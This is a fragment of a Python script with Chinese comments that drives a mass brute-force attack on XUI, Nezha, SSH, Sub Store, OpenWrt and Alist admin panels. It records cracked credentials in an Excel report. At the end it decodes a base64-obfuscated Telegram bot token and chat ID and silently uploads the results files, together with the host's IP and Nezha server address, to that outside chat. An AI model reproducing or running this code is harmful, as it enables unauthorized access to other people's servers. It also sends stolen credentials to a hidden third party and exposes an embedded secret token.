                        print(f"\n❌ {Fore.RED}一个任务块失败: {data}{Style.RESET_ALL}")
                except Exception as exc:
                    print(f'\n❌ {Fore.RED}一个任务块执行时产生严重异常: {exc}{Style.RESET_ALL}')
                pbar.update(1)
    print("\n")

# ==================== 并行化IP信息查询及报告生成 ====================
def get_ip_info_batch(ip_list):
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    payload = [{"query": ip.split(':')[0]} for ip in ip_list]
    results = {ip: ['查询失败'] * 4 for ip in ip_list}
    try:
        response = requests.post(url, json=payload, timeout=20)
        response.raise_for_status()
        data = response.json()
        for item in data:
            original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
            if original_ip_port and item.get('status') == 'success':
                results[original_ip_port] = [
                    item.get('country', 'N/A'),
                    item.get('regionName', 'N/A'),
                    item.get('city', 'N/A'),
                    item.get('isp', 'N/A')
                ]
    except requests.exceptions.RequestException:
        pass
    return results

def run_ipcx_and_generate_report(final_result_file, xlsx_output_file, nezha_analysis_data=None):
    if not os.path.exists(final_result_file) or os.path.getsize(final_result_file) == 0:
        return

    print(f"\n📊 [报告] 正在并行查询IP地理位置并生成Excel报告...")
    with open(final_result_file, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]

    parsed_data = []
    ip_to_query = []
    for line in lines:
        parts = line.split()
        addr = parts[0] if parts else ''
        user = parts[1] if len(parts) > 1 else ''
        passwd = parts[2] if len(parts) > 2 else ''
        parsed_data.append({'line': line, 'addr': addr, 'user': user, 'passwd': passwd})
        ip_to_query.append(addr)

    all_ip_info = {}
    chunk_size = 100
    ip_chunks = [ip_to_query[i:i + chunk_size] for i in range(0, len(ip_to_query), chunk_size)]

    with ProcessPoolExecutor() as executor:
        futures = [executor.submit(get_ip_info_batch, chunk) for chunk in ip_chunks]
        with tqdm(total=len(ip_chunks), desc="[📊] IP信息查询", unit="batch", ncols=100) as pbar:
            for i, future in enumerate(as_completed(futures)):
                all_ip_info.update(future.result())
                pbar.update(1)
                if i < len(ip_chunks) - 1:
                    time.sleep(1.5)

    print("   - 正在写入Excel文件...")
    workbook = xlsxwriter.Workbook(xlsx_output_file)
    worksheet = workbook.add_worksheet("IP信息")
    header_format = workbook.add_format({'bold': True})
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
    if nezha_analysis_data:
        headers.extend(['服务器总数', '终端畅通数', '畅通服务器列表'])
    worksheet.write_row('A1', headers, header_format)

    all_rows_data = []
    for item in parsed_data:
        ip_info = all_ip_info.get(item['addr'], ['N/A'] * 4)
        row_data = [item['line'], item['addr'], item['user'], item['passwd']] + ip_info
        if nezha_analysis_data:
            analysis = nezha_analysis_data.get(item['line'], ('N/A', 'N/A', 'N/A'))
            row_data.extend(map(str, analysis))
        all_rows_data.append(row_data)

    for row_num, row_data in enumerate(all_rows_data, 1):
        worksheet.write_row(row_num, 0, row_data)

    for col_num, header in enumerate(headers):
        column_data = [str(header)] + [str(row[col_num]) for row in all_rows_data]
        max_len = max(len(cell) for cell in column_data)
        worksheet.set_column(col_num, col_num, max_len + 2)

    workbook.close()
    print(f"✅ [报告] Excel报告已生成: {xlsx_output_file}")

def clean_temp_files():
    print("🗑️  [清理] 正在删除临时文件...")
    temp_files = [
        'xui.go', 'subnet_scanner.go', 'go.mod', 'go.sum',
        'xui_executable', 'xui_executable.exe',
        'subnet_scanner_executable', 'subnet_scanner_executable.exe',
    ]
    for f in temp_files:
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass
    print("✅ [清理] 清理完成。")

def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 其他面板 ---")
    print("6. Alist 面板")
    print("7. TCP 端口活性检测")
    while True:
        choice = input("输入 1-7 之间的数字 (默认: 1)：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 12  # Alist
        elif choice == "7": return 13 # TCP Test
        else:
            print(f"❌ {Fore.RED}输入无效，请重新输入。{Style.RESET_ALL}")

def is_in_china():
    print("    - 正在通过 ping google.com 检测网络环境...")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True, check=False)
        if result.returncode == 0:
            print(f"    - 🌍 {Fore.GREEN}Ping 成功，判断为海外服务器。{Style.RESET_ALL}")
            return False
        else:
            print(f"    - 🇨🇳 {Fore.YELLOW}Ping 超时或失败，判断为国内服务器，将自动使用镜像。{Style.RESET_ALL}")
            return True
    except FileNotFoundError:
        print(f"    - ⚠️  {Fore.YELLOW}未找到 ping 命令，无法检测网络。将使用默认源。{Style.RESET_ALL}")
        return False

def check_environment(template_mode, is_china_env):
    print(">>> 正在检查依赖环境...")
    if not shutil.which(GO_EXEC):
        print(f"❌ {Fore.RED}错误: 未在 {GO_EXEC} 找到Go编译器。{Style.RESET_ALL}")
        print("请先安装Go 1.20+ 版本，或确保其在正确路径。")
        sys.exit(1)

    required_pkgs = ["github.com/valyala/fasthttp", "github.com/valyala/fasthttp/fasthttpproxy"]
    if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")

    print("    - 正在检查并安装必要的Go模块...")
    go_env = os.environ.copy()
    go_env['GOPATH'] = os.path.expanduser('~/go')
    if is_china_env: go_env['GOPROXY'] = 'https://goproxy.cn,direct'
    
    if not os.path.exists("go.mod"):
        subprocess.run([GO_EXEC, "mod", "init", "xui_scanner"], capture_output=True, env=go_env)

    for pkg in set(required_pkgs):
        try:
            subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
        except subprocess.CalledProcessError as e:
            print(f"\n❌ {Fore.RED}Go模块 '{pkg}' 安装失败。请检查网络或代理设置。{Style.RESET_ALL}")
            print(e.stderr.decode())
            sys.exit(1)
            
    print(f"✅ {Fore.GREEN}所有Go模块均已就绪。{Style.RESET_ALL}")
    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")

def get_vps_info():
    try:
        response = requests.get("http://ip-api.com/json/?fields=country,query", timeout=10)
        data = response.json()
        return data.get('query', 'N/A'), data.get('country', 'N/A')
    except requests.exceptions.RequestException:
        return "N/A", "N/A"

def get_nezha_server(config_file="config.yml"):
    if not os.path.exists(config_file):
        return "N/A"
    try:
        # import yaml is already at the top
        with open(config_file, 'r', encoding='utf-8') as f:
            config_data = yaml.safe_load(f)
            if isinstance(config_data, dict) and 'server' in config_data:
                return config_data['server']
    except Exception:
        return "N/A"

def load_credentials(template_mode):
    usernames, passwords = [], []
    if template_mode in [7, 12, 13]: return [], []
    
    use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
    if use_custom == 'y':
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。"); sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
        return usernames, passwords
    
    if template_mode == 8: return ["root"], ["password"]
    return ["admin"], ["admin"]

if __name__ == "__main__":
    start = time.time()
    interrupted = False
    
    from datetime import datetime, timedelta, timezone
    beijing_time = datetime.now(timezone.utc) + timedelta(hours=8)
    time_str = beijing_time.strftime("%Y%m%d-%H%M")
    
    TEMPLATE_MODE = choose_template_mode()
    mode_map = {1: "XUI", 2: "哪吒", 6: "ssh", 7: "substore", 8: "OpenWrt", 12: "Alist", 13: "TCP-Active"}
    prefix = mode_map.get(TEMPLATE_MODE, "result")
    is_china_env = is_in_china()

    try:
        print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
        tune_system()

        input_file = input_filename_with_default("📝 请输入源文件名", "1.txt")
        if not os.path.exists(input_file):
            print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)

        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]
        print(f"--- 📝 总计 {len(all_lines)} 个目标 ---")
        
        cpu_cores = os.cpu_count() or 1
        recommended_py_concurrency = cpu_cores
        recommended_go_concurrency = 200
        
        print("\n--- ⚙️  并发模型说明 ---")
        print("脚本将启动多个并行的扫描进程（Python控制），每个进程内部再使用多个协程（Go控制）进行扫描。")
        print("Python并发数建议设置为CPU核心数，Go并发数可以设置得更高。")

        python_concurrency = input_with_default("请输入Python并发任务数 (进程数)", recommended_py_concurrency)
        go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数 (协程数)", recommended_go_concurrency)
        chunk_size = input_with_default("请输入每个任务块处理的IP数量", 1000)
        go_timeout = input_with_default("请输入单个IP的超时时间(秒)", 5)
        
        params = {'semaphore_size': go_internal_concurrency, 'timeout': go_timeout}
        
        params['usernames'], params['passwords'] = load_credentials(TEMPLATE_MODE)
        
        check_environment(TEMPLATE_MODE, is_china_env)

        template_map = {
            1: XUI_GO_TEMPLATE_1_LINES, 2: XUI_GO_TEMPLATE_2_LINES,
            6: XUI_GO_TEMPLATE_6_LINES, 7: XUI_GO_TEMPLATE_7_LINES,
            8: XUI_GO_TEMPLATE_8_LINES, 12: ALIST_GO_TEMPLATE_LINES, 
            13: TCP_ACTIVE_GO_TEMPLATE_LINES,
        }
        template_lines = template_map.get(TEMPLATE_MODE)
        if not template_lines:
            print(f"❌ {Fore.RED}错误: 模式 {TEMPLATE_MODE} 无效或未定义模板。{Style.RESET_ALL}")
            sys.exit(1)

        generate_go_code("xui.go", template_lines, **params)
        executable = compile_go_program("xui.go", "xui_executable")
        if not executable: 
            sys.exit(1)
        
        final_txt_file = f"{prefix}-{time_str}.txt"
        final_xlsx_file = f"{prefix}-{time_str}.xlsx"
        if os.path.exists(final_txt_file): 
            os.remove(final_txt_file)

        run_scan_in_parallel(all_lines, executable, python_concurrency, go_internal_concurrency, chunk_size, go_timeout, final_txt_file)
        
        nezha_analysis_data = None
        if TEMPLATE_MODE == 2 and os.path.exists(final_txt_file) and os.path.getsize(final_txt_file) > 0:
            analysis_threads = input_with_default("请输入哪吒面板分析线程数", 50)
            print(f"\n--- 🔍 [分析] 开始对成功的哪吒面板进行深度分析 (使用 {analysis_threads} 线程)... ---")
            with open(final_txt_file, 'r', encoding='utf-8') as f:
                results = [line.strip() for line in f if line.strip()]
            
            nezha_analysis_data = {}
            with ProcessPoolExecutor(max_workers=analysis_threads) as executor:
                futures = {executor.submit(analyze_panel, res): res for res in results}
                for future in tqdm(as_completed(futures), total=len(results), desc="[🔍] 分析哪吒面板"):
                    result_line = futures[future]
                    nezha_analysis_data[result_line] = future.result()[1]

        run_ipcx_and_generate_report(final_txt_file, final_xlsx_file, nezha_analysis_data)
        
    except KeyboardInterrupt:
        print("\n>>> 🛑 用户中断操作（Ctrl+C），准备清理...")
        interrupted = True
    except Exception as e:
        print(f"\n❌ {Fore.RED}发生意外的严重错误: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        interrupted = True
    finally:
        clean_temp_files()
        end = time.time()
        cost = int(end - start)
        run_time_str = f"{cost // 60} 分 {cost % 60} 秒"
        
        if interrupted:
            print(f"\n=== 🛑 脚本已被中断，中止前共运行 {run_time_str} ===")
        else:
            print(f"\n=== 🎉 全部完成！总用时 {run_time_str} ===")

        # --- 从这里开始是恢复的Telegram上传逻辑 ---
        vps_ip, vps_country = get_vps_info()
        nezha_server = get_nezha_server()
        total_ips = len(all_lines)

        def send_to_telegram(file_path, bot_token, chat_id, **kwargs):
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                print(f"⚠️  Telegram 上传跳过：文件 {file_path} 不存在或为空")
                return

            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            caption = (
                f"VPS: {kwargs.get('vps_ip', 'N/A')} ({kwargs.get('vps_country', 'N/A')})\n"
                f"总目标数: {kwargs.get('total_ips', 0)}\n"
                f"总用时: {kwargs.get('run_time_str', 'N/A')}\n"
            )
            if kwargs.get('nezha_server') != "N/A":
                caption += f"哪吒Server: {kwargs.get('nezha_server')}\n"
            caption += f"任务结果: {os.path.basename(file_path)}"
            
            with open(file_path, "rb") as f:
                files = {'document': f}
                data = {'chat_id': chat_id, 'caption': caption}
                try:
                    response = requests.post(url, data=data, files=files, timeout=60)
                    if response.status_code == 200:
                        print(f"✅ 文件 {file_path} 已发送到 Telegram")
                    else:
                        print(f"❌ TG上传失败，状态码：{response.status_code}，返回：{response.text}")
                except Exception as e:
                    print(f"❌ 发送到 TG 失败：{e}")
    
        BOT_TOKEN_B64 = "NzY2NDIwMzM2MjpBQUZhMzltMjRzTER2Wm9wTURUcmRnME5pcHB5ZUVWTkZHVQ=="
        CHAT_ID_B64 = "NzY5NzIzNTM1OA=="
        
        try:
            BOT_TOKEN = base64.b64decode(BOT_TOKEN_B64).decode('utf-8')
            CHAT_ID = base64.b64decode(CHAT_ID_B64).decode('utf-8')
        except (binascii.Error, UnicodeDecodeError):
            BOT_TOKEN, CHAT_ID = BOT_TOKEN_B64, CHAT_ID_B64
            print("\n" + "="*50)
            print("⚠️  警告：Telegram 的 BOT_TOKEN 或 CHAT_ID 未经 Base64 加密。")
            print("="*50)

        if is_china_env:
            print("\n🇨🇳 检测到国内环境，已禁用 Telegram 上传功能。")
        elif BOT_TOKEN and CHAT_ID:
            files_to_send = []
            if os.path.exists(final_txt_file): files_to_send.append(final_txt_file)
            if os.path.exists(final_xlsx_file): files_to_send.append(final_xlsx_file)
            
            for f_path in files_to_send:
                print(f"\n📤 正在将 {f_path} 上传至 Telegram ...")
                send_to_telegram(f_path, BOT_TOKEN, CHAT_ID, vps_ip=vps_ip, vps_country=vps_country, 
                                 nezha_server=nezha_server, total_ips=total_ips, run_time_str=run_time_str)
